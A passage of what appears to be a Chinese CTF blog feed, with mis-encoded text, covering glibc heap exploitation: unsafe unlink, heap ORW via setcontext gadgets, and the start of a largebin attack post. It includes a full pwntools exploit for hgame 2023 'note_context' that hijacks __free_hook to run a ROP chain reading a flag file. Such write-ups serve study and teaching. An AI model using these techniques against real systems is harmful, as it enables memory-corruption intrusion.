class="hljs-built_in">free</span>(chunk1_ptr);<br><br><span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br><span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br><br><span class="hljs-comment">// sanity check</span><br>assert(*(<span class="hljs-type">long</span> *)victim_string == <span class="hljs-number">0x4141414142424242</span>L);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>è¿ç»­mallocä¸¤ä¸ªunsorted binèŒƒå›´å†…çš„chunkï¼ˆ2.26ä»¥ä¸Šå¤§å°éœ€è¦åœ¨tcacheä¹‹å¤–ï¼‰ï¼Œchunk0å’Œchunk1<img src="/2023/01/29/unsafe-unlink/1.jpg" class title="æ­¥éª¤ä¸€"></li><li>åœ¨chunk0å†…ä¼ªé€ fake chunk<img src="/2023/01/29/unsafe-unlink/2.jpg" class title="æ­¥éª¤äºŒ"></li><li>ä¿®æ”¹chunk1çš„presizeå’Œsizeçš„inuseä½ï¼ˆå¯ä»¥é€šè¿‡of by nullæ¼æ´ï¼ˆæˆ–è€…fastbin_dup_consolidateï¼‰+ç”³è¯·å¤§å°0x8ç»“å°¾çš„chunkå®ç°ï¼ˆä½¿ç”¨next chunkçš„presizeéƒ¨åˆ†ï¼‰ï¼‰<img src="/2023/01/29/unsafe-unlink/3.jpg" class title="æ­¥éª¤ä¸‰"></li><li>free(chunk1)è§¦å‘chunk0çš„å‘ä¸Šåˆå¹¶ï¼Œè§¦å‘unlinkæ‘˜é™¤chunk0<img src="/2023/01/29/unsafe-unlink/4.jpg" class title="æ­¥éª¤å››"></li><li>æœ€åçš„ç»“æœå°±æ˜¯æŒ‡å‘chunk0çš„æŒ‡é’ˆç°åœ¨æŒ‡å‘æŒ‡é’ˆåœ°å€-0x18çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¦†ç›–æŒ‡å‘chunk0æŒ‡é’ˆæŒ‡å‘åˆ«çš„åœ°æ–¹å¹¶ä¸”æ”¹å†™é‚£é‡Œçš„å†…å®¹</li></ul><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>è§fastbin dup consolidate</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å †orw</title>
    <link href="/2023/01/27/%E5%A0%86orw/"/>
    <url>/2023/01/27/%E5%A0%86orw/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åšæ ˆä¸Šçš„orwæ—¶çœ‹åˆ°è¿‡å †ä¸Šçš„orwï¼Œè¿™æ¬¡å°±ç¢°åˆ°äº†ã€‚å®‰æ’ï¼o(<em>ï¿£â–½ï¿£</em>)ãƒ–</p><span id="more"></span><h1 id="2-29ä»¥ä¸‹"><a href="#2-29ä»¥ä¸‹" class="headerlink" title="2.29ä»¥ä¸‹"></a>2.29ä»¥ä¸‹</h1><p>å †ä¸Šçš„orwä¸»è¦å°±æ˜¯åˆ©ç”¨setcontextå‡½æ•°ä¸­çš„gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;setcontext+<span class="hljs-number">53</span>&gt;:  mov    rsp,QWORD PTR [rdi+<span class="hljs-number">0xa0</span>]<br>&lt;setcontext+<span class="hljs-number">60</span>&gt;:  mov    rbx,QWORD PTR [rdi+<span class="hljs-number">0x80</span>]<br>&lt;setcontext+<span class="hljs-number">67</span>&gt;:  mov    rbp,QWORD PTR [rdi+<span class="hljs-number">0x78</span>]<br>&lt;setcontext+<span class="hljs-number">71</span>&gt;:  mov    r12,QWORD PTR [rdi+<span class="hljs-number">0x48</span>]<br>&lt;setcontext+<span class="hljs-number">75</span>&gt;:  mov    r13,QWORD PTR [rdi+<span class="hljs-number">0x50</span>]<br>&lt;setcontext+<span class="hljs-number">79</span>&gt;:  mov    r14,QWORD PTR [rdi+<span class="hljs-number">0x58</span>]<br>&lt;setcontext+<span class="hljs-number">83</span>&gt;:  mov    r15,QWORD PTR [rdi+<span class="hljs-number">0x60</span>]<br>&lt;setcontext+<span class="hljs-number">87</span>&gt;:  mov    rcx,QWORD PTR [rdi+<span class="hljs-number">0xa8</span>]<br>&lt;setcontext+<span class="hljs-number">94</span>&gt;:  push   rcx<br>&lt;setcontext+<span class="hljs-number">95</span>&gt;:  mov    rsi,QWORD PTR [rdi+<span class="hljs-number">0x70</span>]<br>&lt;setcontext+<span class="hljs-number">99</span>&gt;:  mov    rdx,QWORD PTR [rdi+<span class="hljs-number">0x88</span>]<br>&lt;setcontext+<span class="hljs-number">106</span>&gt;: mov    rcx,QWORD PTR [rdi+<span class="hljs-number">0x98</span>]<br>&lt;setcontext+<span class="hljs-number">113</span>&gt;: mov    r8,QWORD PTR [rdi+<span class="hljs-number">0x28</span>]<br>&lt;setcontext+<span class="hljs-number">117</span>&gt;: mov    r9,QWORD PTR [rdi+<span class="hljs-number">0x30</span>]<br>&lt;setcontext+<span class="hljs-number">121</span>&gt;: mov    rdi,QWORD PTR [rdi+<span class="hljs-number">0x68</span>]<br>&lt;setcontext+<span class="hljs-number">125</span>&gt;: xor    eax,eax<br>&lt;setcontext+<span class="hljs-number">127</span>&gt;: ret<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†setcontext+53çš„åœ°å€å†™å…¥free_hookä¸­ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œfree(chunk1)æ—¶ï¼Œchunk1çš„åœ°å€ï¼ˆdataæ®µåœ°å€ï¼‰ä¼šè¢«ä¼ å…¥rdiï¼Œè¿™æ ·æˆ‘ä»¬å°±æ§åˆ¶äº†rdiï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡rdiæ§åˆ¶å¯„å­˜å™¨<br>æˆ‘ä»¬éœ€è¦æ§åˆ¶çš„å¯„å­˜å™¨å°±æ˜¯rspå’Œrcxï¼š    </p><ul><li><p>æˆ‘ä»¬éœ€è¦å°†å·²ç»å†™å¥½çš„orwé“¾çš„åœ°å€å†™åœ¨rdi+0xa0å¤„ï¼Œè¿™æ ·å°±èƒ½é€šè¿‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;setcontext+<span class="hljs-number">53</span>&gt;:  mov    rsp,QWORD PTR [rdi+<span class="hljs-number">0xa0</span>]<br></code></pre></td></tr></table></figure><p>å®ç°æ ˆè¿ç§»</p></li><li><p>æˆ‘ä»¬è¿˜éœ€è¦å°†ä¸€ä¸ªretæŒ‡ä»¤çš„åœ°å€å†™åœ¨rdi+0xa8å¤„ï¼Œå› ä¸ºpush rcxä¼šå°†rcxå…¥æ ˆï¼Œretæ‰§è¡Œçš„å°±æ˜¯rcxçš„åœ°å€</p></li></ul><h1 id="2-29ä»¥ä¸Š"><a href="#2-29ä»¥ä¸Š" class="headerlink" title="2.29ä»¥ä¸Š"></a>2.29ä»¥ä¸Š</h1><h2 id="gadget-setcontext"><a href="#gadget-setcontext" class="headerlink" title="gadget+setcontext"></a>gadget+setcontext</h2><p>2.29ä¹‹åsetcontextä¸­çš„gadgetå˜æˆäº†ä»¥rdxç´¢å¼•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€äº›èƒ½æ§åˆ¶rdxçš„gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000000580</span>DD                 mov     rsp, [rdx+<span class="hljs-number">0</span>A0h]<br>.text:<span class="hljs-number">00000000000580E4</span>                 mov     rbx, [rdx+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">00000000000580</span>EB                 mov     rbp, [rdx+<span class="hljs-number">78</span>h]<br>.text:<span class="hljs-number">00000000000580</span>EF                 mov     r12, [rdx+<span class="hljs-number">48</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>3                 mov     r13, [rdx+<span class="hljs-number">50</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>7                 mov     r14, [rdx+<span class="hljs-number">58</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>B                 mov     r15, [rdx+<span class="hljs-number">60</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>F                 test    dword ptr fs:<span class="hljs-number">48</span>h, <span class="hljs-number">2</span><br>    ....<br>.text:<span class="hljs-number">00000000000581</span>C6                 mov     rcx, [rdx+<span class="hljs-number">0</span>A8h]<br>.text:<span class="hljs-number">00000000000581</span>CD                 push    rcx<br>.text:<span class="hljs-number">00000000000581</span>CE                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">00000000000581</span>D2                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">00000000000581</span>D6                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">00000000000581</span>DD                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">00000000000581E1</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">00000000000581E5</span>                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">00000000000581</span>EC                 xor     eax, eax<br>.text:<span class="hljs-number">00000000000581</span>EE                 retn<br></code></pre></td></tr></table></figure><p>getkeyserv_handle+576æœ‰ä¸€æ®µgadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">mov     rdx, [rdi+<span class="hljs-number">8</span>]<br>mov     [rsp+<span class="hljs-number">0</span>C8h+var_C8], rax<br>call    qword ptr [rdx+<span class="hljs-number">20</span>h]<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡rdiæ§åˆ¶rdxï¼Œä»2.29åˆ°2.32éƒ½å¯ä»¥ç”¨     </p><ul><li>free_hookå†™å…¥getkeyserv_handle+576</li><li>rdi+8å†™å…¥rdxçš„å€¼</li><li>rdx+0x20å†™å…¥setcontext+53çš„å€¼</li><li>rdx+0xa0å†™å…¥orwé“¾çš„åœ°å€</li><li>rdi+0xa8å†™å…¥ä¸€ä¸ªretæŒ‡ä»¤çš„åœ°å€</li></ul><h2 id="gadget-æ ˆè¿ç§»"><a href="#gadget-æ ˆè¿ç§»" class="headerlink" title="gadget+æ ˆè¿ç§»"></a>gadget+æ ˆè¿ç§»</h2><p>gadget svcudp_reply+26ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">mov rbp, qword ptr [rdi + <span class="hljs-number">0x48</span>]; <br>mov rax, qword ptr [rbp + <span class="hljs-number">0x18</span>]; <br>lea r13, [rbp + <span class="hljs-number">0x10</span>]; <br>mov dword ptr [rbp + <span class="hljs-number">0x10</span>], <span class="hljs-number">0</span>; <br>mov rdi, r13; <br>call qword ptr [rax + <span class="hljs-number">0x28</span>];<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡rdiæ§åˆ¶rbpçš„å€¼å®ç°æ ˆè¿ç§»ï¼Œè¿˜å¯ä»¥é€šè¿‡rbpæ§åˆ¶raxå®ç°ç¨‹åºçš„è·³è½¬</p><h1 id="hgame-2023-week3-note-context"><a href="#hgame-2023-week3-note-context" class="headerlink" title="hgame 2023 week3 note_context"></a>hgame 2023 week3 note_context</h1><p>æ€è·¯è§ä¸ŠğŸ‘†ï¼Œç›´æ¥æ”¾expäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br>p=process(<span class="hljs-string">&#x27;./context&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;week-3.hgame.lwsec.cn&#x27;,30223)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>tcache_max_bin=libcbase+<span class="hljs-number">0x1e3280</span>+<span class="hljs-number">80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_max_bin))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">0</span>)<br>pad1=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pad1))<br>edit(<span class="hljs-number">0</span>,p64(pad1)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(tcache_max_bin-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">5</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=(u64(s)&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x1000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x610</span>)<br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">6</span>,p64(pack(heap+<span class="hljs-number">0x2930</span>,free_hook)))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x610</span>)<br><br>rdx_addr=libcbase+<span class="hljs-number">0x14b760</span><br>ret_addr=libcbase+<span class="hljs-number">0x26699</span><br>set_context_addr=libcbase+<span class="hljs-number">0x5306d</span><br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi_addr=libcbase+<span class="hljs-number">0x2858f</span><br>pop_rsi_addr=libcbase+<span class="hljs-number">0x2ac3f</span><br>pop_rdx_r12_addr=libcbase+<span class="hljs-number">0x114161</span><br>payload=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(heap+<span class="hljs-number">0x2310</span>+<span class="hljs-number">0x18</span>)+<span class="hljs-number">0x18</span>*<span class="hljs-string">b&#x27;\x00&#x27;</span>+p64(set_context_addr)<br>payload+=(<span class="hljs-number">0xa8</span>-<span class="hljs-number">0x30</span>)*<span class="hljs-string">b&#x27;\x00&#x27;</span>+p64(heap+<span class="hljs-number">0x2310</span>+<span class="hljs-number">0x100</span>)+p64(ret_addr)<br>payload+=(<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>-<span class="hljs-number">0x18</span>)*<span class="hljs-string">b&#x27;\x00&#x27;</span><br>payload+=p64(pop_rdi_addr)+p64(heap+<span class="hljs-number">0x2320</span>)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x2310</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(read_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x2310</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(write_addr)<br>gdb.attach(p)<br>edit(<span class="hljs-number">9</span>,p64(rdx_addr))<br>edit(<span class="hljs-number">8</span>,payload)<br>delete(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
      <tag>orw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>large bin attack</title>
    <link href="/2023/01/25/large-bin-attack/"/>
    <url>/2023/01/25/large-bin-attack/</url>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯hgameï¼ˆè®©æˆ‘ä»¬è¯´è°¢è°¢hgameï¼‰ï¼Œä¹‹å‰å­¦çš„æ—¶å€™æœ‰çœ‹åˆ°è¿‡è¿™ä¸ªæ”»å‡»æ–¹å¼ï¼Œå½“æ—¶è§‰å¾—å¾ˆé¸¡è‚‹ï¼Œç°åœ¨å•ªå•ªæ‰“è„¸â”((*â€²Ğ´ï½€)çˆ»(â€²Ğ´ï½€*))â”!!!!</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>large bin attackéœ€è¦åˆ©ç”¨çš„æ˜¯mallocé‡Œå°†chunkä»unsorted binæ‘˜é™¤ï¼Œæ”¾å…¥large binçš„è¿‡ç¨‹ï¼Œç›¸å…³æºç å¦‚ä¸‹ï¼ˆpsï¼šå†æ”¾ä¸€élargebinç»“æ„ï¼‰ï¼ˆppsï¼šchunké“¾çš„å¤´ç»“ç‚¹çš„bkæŒ‡å‘æ›´å¤§çš„chunké“¾çš„å¤´èŠ‚ç‚¹ï¼Œå°¾ç»“ç‚¹çš„fdæŒ‡å‘æ›´å°çš„chunké“¾çš„å¤´èŠ‚ç‚¹ï¼‰ï¼š</p><img src="/2023/01/25/large-bin-attack/large_bin.jpg" class title="large_bin"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br><span class="hljs-comment">//å®šä½è‡³unsorted binçš„æœ€åä¸€ä¸ªchunkä¸€ä¸ªä¸ªæ‘˜ä¸‹ç›´åˆ°unsorted binæ²¡æœ‰chunk</span><br>        &#123;<br>          bck = victim-&gt;bk;<br><span class="hljs-comment">//ç­›å»è¿‡å¤§æˆ–è¿‡å°çš„chunk</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>â€¦â€¦<br><br><span class="hljs-comment">//ä»unsorted binä¸­æ‘˜ä¸‹chunkçš„è¿‡ç¨‹</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>â€¦â€¦<br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>â€¦â€¦<br>            &#125;<br><span class="hljs-comment">//æ”¾å…¥large bin</span><br>          <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-comment">//è®¡ç®—index</span><br>              victim_index = largebin_index (size);<br><span class="hljs-comment">//bckå®šä½è‡³ç¬¬ä¸€ä¸ªchunké“¾ï¼ˆlarge binæ•°ç»„ï¼‰</span><br>              bck = bin_at (av, victim_index);<br><span class="hljs-comment">//fwdå®šä½è‡³ç¬¬äºŒä¸ªchunké“¾ï¼ˆæœ€å¤§çš„chunké“¾ï¼‰</span><br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//éç©º</span><br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br><span class="hljs-comment">//bck-&gt;bkå®šä½è‡³æœ€åä¸€ä¸ªchunké“¾ï¼ˆæœ€å°çš„chunké“¾ï¼‰</span><br><span class="hljs-comment">//å¦‚æœvictimæ¯”å·²æœ‰æœ€å°çš„chunkè¿˜å°</span><br>                    &#123;<br><span 